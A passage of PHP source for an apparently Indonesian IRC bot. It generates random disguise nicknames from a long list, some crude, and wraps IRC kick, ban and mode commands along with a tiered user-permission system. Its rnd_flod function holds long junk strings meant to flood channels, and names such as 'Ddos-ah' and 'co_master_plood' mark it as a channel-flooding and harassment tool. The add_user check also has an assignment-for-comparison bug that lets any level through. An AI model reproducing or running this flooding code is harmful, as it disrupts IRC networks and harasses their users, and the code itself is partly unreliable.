	"Stonich","Storer","Stott","Strange","Strauch","Streiff","Stringer","Sullivan","Sumner","Suo","Surdam","Sweeting","Sweetser","Swindle","Tagiuri",
	"Tai","Talaugon","Tambiah","Tandler","Tanowitz","Tatar","Taveras","Tawn","Tcherepnin","Teague","Temes","Temmer","Tenney","Terracini","Than",
	"Thavaneswaran","Theodos","Thibault","Thisted","Thomsen","Throop","Tierney","Till","Timmons","Tofallis","Tollestrup","Tolls","Tolman","Tomford",
	"Toomer","Topulos","Torresi","Torske","Towler","Toye","Traebert","Trenga","Trewin","Tringali","Troiani","Troy","Truss","Tsiatis","Tsomides","Tsukurov",
	"Tuck","Tudge","Tukan","Turano","Turek","Tuttle","Twells","Tzamarias","Ullman","Untermeyer","Upsdell","Urban","Urdang-Brown","Usdan","Uzuner",
	"Vacca","Waite","Valberg","Valencia","Wales","Wallenberg","Walter","vanAllen","VanZwet","Vandenberg","Vanheeckeren","Warshafsky","Wasowska","Vasquez",
	"Waugh","Weighart","Weingarten","Weinhaus","Weissbourd","Weissman","Velasquez","Welles","Welsh","Wengret","Venne","Verghese","Wescott","Wetzel",
	"Whately","Whilton","White","Whitla","Whittaker","Viana","Viano","Wiedersheim","Wiener","Viens","Vignola","Wilder","Wilhelm","Wilk","Wilkin","Wilkinson",
	"Villarreal","Willstatter","Wilson","Vitali","Viviani","Voigt","Wolk","VonHoffman","Woo","Wooden","Woods","Woods-Powell","Vorhaus","Votey","Yacono",
	"Yamane","Yankee","Yarchuk","Yates","Ybarra","Yedidia","Yesson","Yetiv","Yoffe","Yoo","Youk-See","Yu","Zachary","Zahedi","Zangwill","Zegans","Zerbini",
	"Zoldak","Zucconi","Zurn","Zwiers","MX_CREW","PT_GELAP_GULITA","PT_REDUP","CV_MAKNYUSS","PO_maju-mundur","Warung_kopi","Kota_palembang","PLG-vs-SITUBONDO","jerawatan","jupe","keset","kuburan_band","dream_theater","dj^slipknot","a7X-","co_korn",
	"MX_Community","ce_garung","ce_20fs","ce_tak_mampu","kerox_dah","ce_suk4_kamu","co_sepi_deh","bertato","gj^konde",
	"MX|off","dj^konde","Plaju_fm","kasidahhhh","wonk_pelit","ce_ngantukKkk","38b","bahhhh","palembang-undercover",
	"MX_TEAM","Jupiter^36","Sikat_pak","KaIpin","FaskaIis","tak_gendong","mbah_surip",
	"Ddos-ah","LInux_kabeh","co_kocak","ndL-guanteng","dj^tekor","sum412","metalikaaa","jirok","jambrud",
	"gak_mau_jadi_locop","co_locop","modyaaarrr","ojomaneh","sakkarepmu","ce_kabeh_rekk","co_ngacenggg",
	"PT.remang2","co_buta","co_cari_yg_bulet2","cew_diskoan","ceprooott","pisang_ambon","Mbah_g00gle","yahooooo","webng_elek",
	"engkok","bekna","arapa","MXirc-kupluk","dj^cli","co_master_plood","plooder_kunyit",
	"ap_pole","kusutdah","krasakrusuk","mainsawah","korek_gas","jeduummm","makbyurrrr",
	"ce_masdut","kongkalikong","co_dakian","mantaf_rek","sepet","pait","asemmmm",
	"cew_cari_banci","duda_cari_janda","sikat_kabeh","bronjol","kudis_co","Pantat_co","sprite_co",
	"ayamm","cocacola_co","pa9e","bak0eng","pacen9","skln","^R_i_R_i_N^","jinraZ","cool^bO0y",
	"poseldon^104","vaynrd","k-lined","ce_diguahantu","sibuta_dan_situli","jambred","suster_ngacir","ken_dedesss","semerbak_kentut",
	"kutaklakulaku","co_miskin_pemimpi","co_banyak_dueeet","taktiktuktektok","beletengambune","gredes","co_co_co",
	"sangkedun","tukiman","paijem","roebino","limbad","dunkanin","ce_suka_pegang","Jupiter^127","Jupiter^128","Jupiter^129",
	"Jupiter^130","Jupiter^131","Jupiter^132","Jupiter^133","Jupiter^134","Telkom","Ely","Zue_gilrs","koceng","moseng","Sandi_laseng","Telagah",
	"blutot","Beringsang","sony_erictions","Hp","sup","Gunung","bangau",
	"robot","Pengawal","jubek","Tukiyem","Sumarna",
	"Sarminto","Marjito","bajingan","Siemen","Langai","Murnie", "Wahed", "Tolak", "Aga_jelek",
	"Sandy_bau", "Hendrik_bau", "hendra_laseng", "Poinem_stres", "Tukiem_kebelet", "Tukimin_kasmaran", "Kambing_pak_RT", "Jatuh_cinta", "Cinta_abadi", "apa_itu_cinta", "Capek_dech", "Ampyun_DC",
        "MX_Keren", "MX_Cakep", "mxIRC_MyChan", "Cewek^gateL", "Cowok^pengeN", "Falen_Blagu", "Tiara_Oyes", "Mami_papi", "Papi_sayang_mami", "Sungguh_terlalu", "Metal_rocker", "Metal_Palembang", "ndL_doyan_kambing", "Males_Chating",
        "Jgn_ganggu_gue", "Pv_gue_dunk", "Ali_gili", "Raka_maniak", "Orang_baek", "Putri^misterI", "Ngantukkk", "Pussiing", "Bok3kk", "Roman-Milan", "nak_networkk", "Falens", "Priangs",
        "Libraboyss", "Triple_X", "TarzanXX", "Sapr0l","L0uhann", "Sakmad","Aijjin", "moncossZ", "KAD3k", "S0bluckk", "Goess", "Nie^Cutes", "Najj^mee", "Co_asmarA", 
        "Co^76", "Co^MX", "Master_Xpresi", "Susilo_BY", "Jusuf_Kalah", "Mega_Pro", "Ice_Trisnawati", "Rita_Sugiarto", "Reni^Farida", "Dian_Fahira", "Putri_titian", "RhomaIrama", 
        "RidhoRhoma", "KangenBand", "D`nasibb", "Iis_Dahlia", "The-Master", "J0e^jelek", "Slankersz", "Mbah_Suripp", "Tak_gendong", "Please_wait", "Now_Loading", "New_Folder", 
        "TurtleBay", "Black_Edition", "Special_Edition", "Sodiqq", "David-Beckham", "C-Ronaldo", "Injector_maniak", "Tape_Goreng", "Nyamuk_Ikzs", 
        "Anuku_Bengkak", "To0o0o0o0L0o0o0ng", "mxIRC_VF", "mxIRC_BE", "mxIRC_SE", "Lavendaa", "Wafer_chocolatos", "Mamamia_Lezatoz", "Gue_Ganteng_Kan",
        "emmak_gue_mana","Oyesss_oohhh_Nooo","gembel_ellite","dj_doing","kelambu","pak_kudis","raja_coli","kelemer","selemetik","semelekete","Godain_gue_donk","Buruan_pv_gue","Error-Man","Error-girl","Awassssss","Assalamuala1kum","Permisi_mas","Cewek_injecT","Cewek^17thn","DinNitami","Asjas_marah","nick_keren", "cokelatoz", "Jefri_un", "ceWek`gatel", "sella_mat", "Dora-kecil", "si_manja", "nick_apa", "bang_ma^un", "no^nick",
        "aku_bot", "si_ganjen", "conan^edogawa", "si_mentel", "ce`Manja", "Mr.Jefry", "Jupe_gitchu", "[K]Desa", "^Kagome", "Kimi_No_Yume", "Utada_hikaru",
        "didi_petet","asal_nick","dh4ni", "pv_yuk", "mai_kuraki", "King-Arthas", "Conan", "dora_sedih", "Nec-Nec", "King_bot", "con[a]n`xs", "A-Riise", "Lampard",
        "ZumiZola", "Contiex`s", "Bot_ol", "[A]ntI", "Airins", "rokr_E1", "x-x-x", "Nia_imudh", "jojojo", "nanana", "Si_peot", "E-rix", "kikiki", "shepthy",
        "Sry`nTeall", "mimin", "Devils-Allnetwork", "Mr-V", "jojon", "Die[a]ch", "Phia`e", "pipipi", "ce^cancer", "hahaha", "kokoko", "Jaros^Jr", "spyrozone",
        "Me2T", "Bud2", "maman", "E-Cho^e", "O2-c", "bot_cakep", "R-elf", "bot_ganteng", "V``Th[a]", "Mr_Superman", "Mrs_Dora", "juliez", "juliezmar_zahra", "Gheomancer", 
        "Mr_Solar", "hahihuheho", "mumun", "Mrs_Olief", "Yugo_Beppu", "Nia_caem", "cie_bebek", "cecep`s", "bang_rhoma", "TinaToon", "kop[r]al", "Sima`S", 
        "mengapa_aku_ganteng", "sagitariuz_boyz", "gak_pernah_mandi", "chilis", "mengapa_jadi_bot", "Empathy", "musaddad", "si_narsizz", "hadeuh", "mariana", "melarat", "devils-crew", 
        "YbOT", "bot_kejam", "Franciss", "ChairilAnwar", "Cew_Lutthcu", "Selnare", "dudutz_niech", "venny", "H4n4","SnoOp",
        "korupt[oooo]r", "hasan_bin_ma^un", "lelah_jadi_bot", "Miss_zahra", "kindaici", "pak-sby", "[J]agung", "[C]hiluc", "aissyah","BadBoy","BotEdan","Ampun-Dc","SiUsil",
        "nedved","jefrot","kael","kurcaci_jangkung","maiev_shadowsong","nenek_peot","kakek_peot","opa_peot","oma_peot","si_manyun","Kiroro","si_dudullz","Hero`s",
        "Rooster","Panglima","Restore","Ralph","Robert","Superman","Batman","Robin","Telemedia","Sanyo","Sanken","Ken","Ryu","Blanka",
        "Guile","ChunLie","Dorayaki","Sizuka","NoOne","NoBody","NoCheat","Nostradamus","Nockturno","Spooky","SinBad","Raul","RyuZaki",
        "Robby","Richard","Ronaldo","Ronaldinho","SonGoKu","TenShinHan","Kuririn","Pikkorro","SonGoTen","Trunks","Bezzitta","JinKuraKura",
        "ChiChi","Burma","Yamucha","Shell","Bhuu","Bezitz","SonGoHan","BolaNaga","BolaDunia","Captain","Crontab","Config","CGI","PCI","Express",
        "Installing","Configuration","Repair","BlackRX","RXRobo","RXBio","Ultraman","Ultramilk","KeyPad","KeyLock","Disket","Siescha",
        "Chick","Chuck","Check","Chock","Chack","Chacky","Friday","Sunday","Monday","Tuesday","Saturday","Thursday","Wednsday","March",
        "August","September","October","November","December","January","February","April","May","June","July","Founder","Keeper","Spammer",
        "Flooder","DhieKa","DhieCha","DhieDie","DhieNi","DhieTa","DhiSka","Dragon","Wolf","Ryans","Eddy","Edd","God","Ope","Offside","Inside","Outside",
        "DhieRa","DhieKi","DhieNa","DhieTan","DhieAn","DhieSep","DhieDonk","DhieNie","DhieCap","RaKaN","Unila","Darmajaya","UBL","UTB","Malahayati",
        "Griya","Teknokrat","Mantra","Umitra","Mitra","MoKa","Artomoro","Alfa","Saburai","UnSab","Kroto","Bandar","Narkoba","Togel","Kisno","DaniPedrossa",
        "ValentinoRossy","ChristVermeulen","NickyHayden","JohnHopkins","LorisCapirossi","Lorenzo","Cappuccino","CafeKito","TelukBetung",
        "Kemiling","Sukarame","TanjungKarang","BandarLampung","KotaBumi","PringSewu","SukaBumi","SukaRaja","Panjang","Pemandangan","Meteor",
        "Swiss","SpaceLounge","SpaceAlone","LounDigital","SUryadarma","SMK2Mei","SMKNUnila","YPUnila","SuryaDharma","STMBhinneka","SMKSN",
        "SMKN1","SMKN2","SMKN3","SMKN4","SMKN5","SMKN6","SMKN7","SMKN8","SMKN9","SMKN10","SMKN11","SMKN12","SMKN13","SMKN14","SMKN15","SMKN16","SMKN17",
        "Korpri","KarangAnyar","Natar","Metro","Probolinggo","LampungBarat","LampungSelatan","LampungTengah","Wates","BandarJaya","TalangPadang",
        "Tanggamus","VivaVilla","ChanTiks","Mellow","Romantic","mrBOY","mrCOOL","mrSad","mrFighter","Attacker","Finisher","FlawlessVictory",
        "Fantassy","MusicPost","HackedBY","Defacer","Exploiteder","Phreaker","Chatters","Users","GuestStar","Guester","Guest","Guest7610","GuestN73",
        "SonyEricson","Motorolla","Nokia","PlayMate","SoulMate","Dreamer","Worker","Willy","Antic","Artic","Ambalat","anggoro","anggia","angguk","Geleng",
        "Giling","Gulung","Galang","Golong","CoolBaby","NiceBaby","SweetBaby","Childist","Childer","Charming","Charmed","Beauty","Beast","Juliett","Romeo",
        "Tiwana","Grill","DarkCyber","DrunkenMaster","Drunken","Player","Eater","Beater","BeatMe","LyllFonda","AsiaCarrerra","Miyabi","MariaOzawa",
        "Horrible","Kingdom","Computer","Computindo","ElexMedia","FoxPro","VisualBasic","VisualC","Office","OfficeWord","OfficeExcel","OfficeAccess",
        "WindowsXP","WindowsVista","Windows2000","Windows98","WindowsMedia","Winamp","Winzip","Allzip","Alleggro","Prince","Yamaha","FunnyCats",
        "KuraKuraNinja","Andie","Lucass","RandyDePuniet","DoniTata","Donita","Daniel","Daniella","CaseyStonner","MaxBiaggi","Speeder","Walker","Runner",
        "Carrier","Protos","Zerg","Terran","ProtosCanon","ProtosDarkTerror","ProtosSpyShip","ZergDragon","TerranBarrack","TerranTank","TerranMissille",
        "TerranBunker","TerranRadar","TerranMarine","TerranNucklear","NucklearDetector","SpaceShips","Trooper","ProtosPsy","TerranAssimilator",
        "TerranUpgrade","ProtosUpgrade","ProtosBOT","Protosfer","ProtosEngine","BuildMoreSupply","ShowMeTheMoney","BlackSheepWall","WarCraft",
        "AlienShooter","Asimilator","Bunker","Kurt","Davids","Kyle","Roys","Hanks","Tom","Tommy","Angela","Lynda","HotButts","HardHolly","Rocks","Spirits",
        "PreCompile","Compiler","Completed","Exceeded","AgeOfEmpire","MotoGP","LapsToGo","Building","TownCenter","LevelOP","Aksess","DocumentRoot",
        "MakeFile","CD","Mkdir","Copyleft","Copy","Delete","Rm-Rf","Tar-zxvf","Rusak","Fools","Abuser","Ash","Cathrine","Willson","WillSmith","WouldUMarry",
        "MarryJane","AshleyCock","NetBean","JavaEmulator","JavaLanguage","Javanesse","Human","AOP","SOP","HOP","FO","Charger","Top","Down","Back","Next","Repeat",
        "Start","Stop","Before","After","Stars","Simpsons","AshleyCole","Coleman","Daddy","Mommy","Mom","Dad","Uncle","Aunt","Daughter","Brother","Sister",
        "GrandMa","GrandPa","CJ","aJ","aSL","aNt","Oktaria","Ramadhan","IdulFitri","IdulAdha","IdulQurban","Grinch","Spanish","Russian","Turks","Sparks",
        "Zylot","Zygot","Kiddie","Childie","Oldie","YounG","SmarT","IndoFood","IndoZone","IndoHack","IndoSpamm","IndoFlood","IndoCyber","IndoCount",
        "Smoker","Masking","MaskedRider","Rider","Ryacudu","Stabilizer","Printer","BackYard","FrontFace","Network","School","Colegge","Professor",
        "NaughtyAmerica","MySisterHotFriends","MyFriendHotMoms","MyHotFriends","Little","Bitt","FrontPage","Fool","Kareena","Girls","Ninna",
        "Nanda","Nindy","RUddy","Stuward","FrodoBaggins","Pherry","Fery","Fendor","PublicManager","Connections","Received","Sending","Sent","Receive",
        "Pending","Virgil","Shark","Sharpen","Addobe","Reader","CapekDech","UdahAch","IsengDikit","TestingBoss","Spada","AnyBody","Rida","Sita","Udahan"
        );
        return $nickbot[rand(0,count($nickbot) - 1)];
    }
    function rnd_identnya(){
        $nickbota=array("");
        $nickdepan=$nickbota[rand(0,count($nickbota) - 1)];
        return $nickdepan;
    }
    function rnd_real(){
        $realnya=array("8,1)|(1,9 FraNGky ngek@PHP.bot 8,1)|(");
        $tambahanrealnya=array("8,1)|(1,9 FraNGky ngek 8,1)|(");
        $realnamebotny=$realnya[rand(0,count($realnya) - 1)]." ".$tambahanrealnya[rand(0,count($tambahanrealnya) - 1)];
        return $realnamebotny;
    }
    function rnd_away(){
        $awaybot=array("oWnend by FraNGky ngek owen");
        return $awaybot[rand(0,count($awaybot) - 1)];
    }
    function rnd_cycle(){
        $strcycle=array("8,1)|(1,9 FraNGky ngek@PHP.bot 8,1)|(");
        return $strcycle[rand(0,count($strcycle) - 1)];
    }
    function rnd_flod(){
        $strflod=array("[]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi",
                       "4,4@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@",
                       "???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????",
                       "[]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi",
                       "@%@?@%@?@%@?@%@?@%@?@%@?@%@?@%@?@%@?@%@?@%@?*@%@?@%@?@%@?@%@?@%@?@%@?@%@?@%@?@%@?@%@?@%@?*@%@?@%@?@%@?@%@?@%@?@%@?@%@?@%@?@%@?@%@?@%@?*@%@?@%@?@%@?@%@?@%@?@%@?@%@?@%@?@%@?@%@?@%@?*@%@?@%@?@%@?@%@?@%@?@%@?@%@?@%@?@%@?@%@?@%@?*@%@?@%@?@%@?@%@?@%@?@%@?@%@?@%@?@%@?@%@?@%@?*@%@?@%@?@%@?@%@?@%@?@%@?@%@?@%@?@%@?@%@?@%@?*@%@?@%@?@%@?@%@?@%@?@%@?@%@?@%@?@%@?@%@?@%@?*@%@?@%@?@%@?@%@?@%@?@%@?@%@?@%@?@%@?@%@?@%@?*@%@?@%@?@%@?@%@?@%@?@%@?@%@?@%@?@%@?@%@?@%@?*@%@?@%@",
                       "[]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi"
                       );
        return $strflod[rand(0,count($strflod) - 1)];
    }
    function rnd_slapampun(){
        $sampunbot=array("bos kojom yuk!","aku neng kene bos!! ojo atek dislaps!!","sini? pv aq bos","kenapa bos?!!","wedew","muach..muach...","ciatsssss... hehehe..","slap? pingin di tium ta?","ampun bosss, aku ndak nakal lagi","siaaaappp bos, ada yang bisa saya buantingin? piring, gelas gtu..",
                         "hiks..nasib?","jadi tukang slap ya, bos?","edan!!!","mama... tolong....","papa... tolong...","ada apa bos!!!, slap? ra ngerti sik kojom apa?","watauuu tega banget kau boss!!!","Siap!!!","aku di sini sayang","lagi enak? kojom dislap ikz.",
                         "Ready!!","aduh...jangan di slap dong.. pv aja","iya sayang...","Boss JELEK!!!","Ready to command!","scream!!!!","mama... bos Q jahat!","jahat banget sihh..","What Mission?");
        return $sampunbot[rand(0,count($sampunbot) - 1)];
    }
    function rnd_slapme(){
        $slapme=array("egk boleh slap ya say...","tak ada ampun buat loh!","nangisooo ae... 4Dont Slap Me!!","heheheh ciatsssssssssss. tendangan jet lee","Rasakan ini...","Dudutz","yeee...pv aja, gk usah pake slap..");
        return $slapme[rand(0,count($slapme) - 1)];
    }
    function rnd_slapbos(){
        $slapbos=array("huneQ jangan dislap!!","Dont slap my bos!!","Kacian Bos Tauw!!!","bosQ masih sibuk","bosQ lagi tidur, mohon jangan di ganggu","2HaKz DeZz..","2Awas..!!!","2eiT's..","2HayOo NaKaLs..","jangan ganggu boskuuuuuu","ra ngerti bos lagi sibuk apa... ciattttttttttt jwedak");
        return $slapbos[rand(0,count($slapbos) - 1)];
    }
    #### MODULE IRC #######
    
    function send($sock,$msg){fputs($sock,"$msg".CRLF); }
    function quit($sock,$msg){if($msg){$this->send($sock,"QUIT :$msg");}  else {$this->send($sock,"QUIT");}sleep(1);   }
    function msg($sock,$to,$msg){$this->send($sock,"PRIVMSG $to :$msg");}
    function act($sock,$to,$msg){$this->send($sock,'PRIVMSG '.$to.' :'.'ACTION '.$msg.'');}
    function invite($sock,$to,$chan){$this->send($sock,"INVITE $to $chan");}
    function notice($sock,$to,$msg){$this->send($sock,"NOTICE $to :$msg");}
    function join($sock,$chan,$kunci=Null){$this->send($sock,"JOIN $chan $kunci"); }
    function part($sock,$chan,$msg){if($msg && (strtolower($msg) != strtolower('#'.$clista.$clistt) )){$this->send($sock,"PART $chan :$msg");}  else {$this->send($sock,"PART $chan");}   }
    function Cycle($sock,$chan,$msg){ if ($msg){$this->part($sock,$chan,$msg);}else{$this->part($sock,$chan,$msg);}        sleep(2);        $this->join($sock,$chan);    }
    function nick($sock,$newnick){$this->send($sock,"NICK $newnick");$bot['nick']=$newnick;   }
    function mode($sock,$mod,$chan,$who){$this->send($sock,"MODE $chan $mod $who");    }
    function kick($sock,$chan,$who,$msg){if($msg){$this->send($sock,"KICK $chan $who :$msg");}else{$this->send($sock,"KICK $chan $who");}    }
    function kickserv($sock,$chan,$who,$msg){$this->msg($sock,"CHANSERV","KICK $chan $who $msg"."");    }
    function ban($sock,$chan,$who){$this->send($sock,"MODE $chan +b $who");    }
    function unban($sock,$chan,$who){$this->send($sock,"MODE $chan -b $who");    }
    function away($sock,$msg){$this->send($sock,"AWAY :$msg");    }
    function noaway($sock){$this->send($sock,"AWAY");    }
    function topic($sock,$chan,$msg){$this->send($sock,"TOPIC $chan $msg");    }
    ####################
    
    
    ##########################
    function add_nickchan($chan,$nick){
        global $user_chan_arr;
        $user_chan_arr[strtolower($chan)]["nick"] = $user_chan_arr[strtolower($chan)]["nick"].' '.$nick. ' ';
        $user_chan_arr[strtolower($chan)]["chan"]=strtolower($chan);
        $user_chan_arr[strtolower($chan)]["nick"]=str_replace("  "," ",$user_chan_arr[strtolower($chan)]["nick"]);
        return "ok";
    }
    function change_nickchan($nick,$newnick){
        global $user_chan_arr;
        foreach ($user_chan_arr as $cur_xchan) {
            $x_chan=$cur_xchan["chan"];
	    $user_chan_arr[strtolower($x_chan)]["nick"]=str_replace(' '.$nick.' ',' '.$newnick.' ',$user_chan_arr[strtolower($x_chan)]["nick"]);
	    $user_chan_arr[strtolower($x_chan)]["nick"]=str_replace('  ',' ',$user_chan_arr[strtolower($x_chan)]["nick"]);
            $user_chan_arr[strtolower($x_chan)]["nick"]=str_replace('  ','',$user_chan_arr[strtolower($x_chan)]["nick"]);
	}
        return "ok";
    }
    function del_nickchan($chan,$nick){
        global $user_chan_arr;
        $user_chan_arr[strtolower($chan)]["nick"]=str_replace(' '.$nick.' ',' ',$user_chan_arr[strtolower($chan)]["nick"]);
	$user_chan_arr[strtolower($chan)]["nick"]=str_replace("  "," ",$user_chan_arr[strtolower($chan)]["nick"]);
        return "ok";
    }
    function show_nickchan($chan){
        global $user_chan_arr;
        $res_nick=$user_chan_arr[strtolower($chan)]["nick"];
        $res_nick=ltrim($res_nick);
        return $res_nick;
    }
    function show_chan(){
        global $user_chan_arr,$bot;
        foreach ($user_chan_arr as $cur_xchan) {
            $showchn=$cur_xchan["chan"];
            if($bot['roomnet']==$cur_xchan["chan"]){$showchn="";};
            if($bot['basechan']==$cur_xchan["chan"]){$showchn="";};
            if($showchn!=""){$res_chan=$res_chan.';'.$cur_xchan["chan"];}
	}
        return $res_chan;
    }
    function destroy_chan($chan){
        global $user_chan_arr;
        unset ($user_chan_arr[$chan]);
        return "ok";
    }
    function destroy_allchan(){
        global $user_chan_arr;
        foreach ($user_chan_arr as $cur_xchan) {
		unset ($user_chan_arr[$cur_xchan["chan"]]);
	}
        unset ($user_chan_arr);
        return "ok";
    }
    #####################
    
    function user_list($nick){
        global $auth;
        $userlist="";
	foreach ($auth as $ulist) {if($ulist["name"]){$userlist .= $ulist["name"].'('.$ulist["status"].')';}}
        return $userlist;
    }
    function add_user($sock,$nick,$user,$pass,$level){
        global $auth,$bot;
        $anick=$nick;
        $nick = strtolower($nick);
	$user = strtolower($user);
        $level = strtolower($level);
        if ($auth["$nick"]["auth"]==2) {
            if ($auth["$nick"]["status"]=="Owner") {
                if ($level=="master" || $level=="user" || $level="admin") {
                    if(!$auth["$user"]["name"]){
                    $auth["$user"]["name"] = $user;
                    $auth["$user"]["pass"] = $pass;
                    $auth["$user"]["status"] = $level;
                    $auth["$user"]["auth"] = 1;
                    $this->notice($sock,$nick,'ADD ['.$user.'] '.$level.' LIsT');
                    $this->notice($sock,$user,''.$anick.' ADD YoU To '.$level.' LIsT wiTh PaSSWoRd: '.$pass);
                    $this->notice($sock,$user,'/msg '.$bot['nick'].' ^login <password>');
                    }else{
                        $this->notice($sock,$nick,$user .' is already exist on '.$auth["$user"]["status"].' list.');
                    }
		} else {$this->notice($sock,$nick,'Wrong Command! Type:.Adduser <nick> <pass> <admin|master|user>');}
            }
            elseif ($auth["$nick"]["status"]=="admin") {
		if ($level=="master" || $level=="user") {
                    if(!$auth["$user"]["name"]){
                    $auth["$user"]["name"] = $user;
                    $auth["$user"]["pass"] = $pass;
                    $auth["$user"]["status"] = $level;
                    $auth["$user"]["auth"] = 1;
                    $this->notice($sock,$nick,'ADD ['.$user.'] '.$level.' LIsT');
                    $this->notice($sock,$user,''.$anick.' ADD YoU To '.$level.' LIsT wiTh PaSSWoRd: '.$pass);
                    $this->notice($sock,$user,'/msg '.$bot['nick'].' ^login <password>');
                    }else{
                        $this->notice($sock,$nick,$user .' is already exist on '.$auth["$user"]["status"].' list.');
                    }
		} else {$this->notice($sock,$nick,'Wrong Command! Type:.Adduser <nick> <pass> <master|user>');}
            }
            elseif ($auth["$nick"]["status"]=="master") {
		if (!$auth["$nick"]["name"]) {
                    if ($level=="user") {
			$auth["$user"]["name"] = $user;
			$auth["$user"]["pass"] = $pass;
			$auth["$user"]["status"] = $level;
			$auth["$user"]["auth"] = 1;
                        $this->notice($sock,$nick,'ADD ['.$user.'] '.$level.' LIsT');
                        $this->notice($sock,$user,''.$anick.' ADD YoU To '.$level.' LIsT wiTh PaSSWoRd: '.$pass);
                        $this->notice($sock,$user,'/msg '.$bot['nick'].' ^login <password>');
                    } else { $this->notice($sock,$nick,'Wrong Command! Type:.Adduser <nick> <pass> user'); }
		} else { $this->notice($sock,$nick,$user .' is already exist on '.$auth["$user"]["status"].' list.'); }
            } else {$this->notice($sock,$nick,'Unknown Status! Your Status is '.$auth["$nick"]["status"]);}
        }
    }
    function del_user($sock,$nick,$user){
        global $auth;
        $anick=$nick;
        $nick = strtolower($nick);
	$user = strtolower($user);
        if ($auth["$nick"]["auth"]==2) {
            if ($auth["$nick"]["status"]=="Owner") {
		if ($auth["$user"]["status"]=="master" || $auth["$user"]["status"]=="user" || $auth["$user"]["status"]=="admin") {
                    $this->notice($sock,$nick,'ADD ['.$user.'] '.$auth["$user"]["status"].' LIsT');
                    $this->msg($sock,$user,''.$anick.' DeL YoU To '.$auth["$user"]["status"].' LIsT');
                    unset($auth["$user"]["name"]); unset($auth["$user"]["pass"]); unset($auth["$user"]["status"]);unset($auth["$user"]["auth"]); unset($auth["$user"]["time"]);
                    unset($auth["$user"]["ident"]); unset($auth["$user"]["host"]);unset($auth["$user"]["seen"]); unset($auth["$user"]);
                } else {$this->msg($sock,$nick,'Wrong Command! Type: .Deluser <nick>'); }
            }
            elseif ($auth["$nick"]["status"]=="admin") {
		if ($auth["$user"]["status"]=="master" || $auth["$user"]["status"]=="user") {
                    $this->notice($sock,$nick,'ADD ['.$user.'] '.$auth["$user"]["status"].' LIsT');
                    $this->msg($sock,$user,''.$anick.' DeL YoU To '.$auth["$user"]["status"].' LIsT');
                    unset($auth["$user"]["name"]); unset($auth["$user"]["pass"]); unset($auth["$user"]["status"]);unset($auth["$user"]["auth"]); unset($auth["$user"]["time"]);
                    unset($auth["$user"]["ident"]); unset($auth["$user"]["host"]);unset($auth["$user"]["seen"]); unset($auth["$user"]);
                } else {$this->msg($sock,$nick,'Wrong Command! Type: .Deluser <nick>'); }
            }
            elseif ($auth["$nick"]["status"]=="master") {
                if ($auth["$user"]["status"]=="user") {
                    $this->notice($sock,$nick,'ADD ['.$user.'] '.$auth["$user"]["status"].' LIsT');
                    $this->msg($sock,$user,''.$anick.' DeL YoU To '.$auth["$user"]["status"].' LIsT');
                    unset($auth["$user"]["name"]); unset($auth["$user"]["pass"]); unset($auth["$user"]["status"]);unset($auth["$user"]["auth"]); unset($auth["$user"]["time"]);
                    unset($auth["$user"]["ident"]); unset($auth["$user"]["host"]);unset($auth["$user"]["seen"]); unset($auth["$user"]);
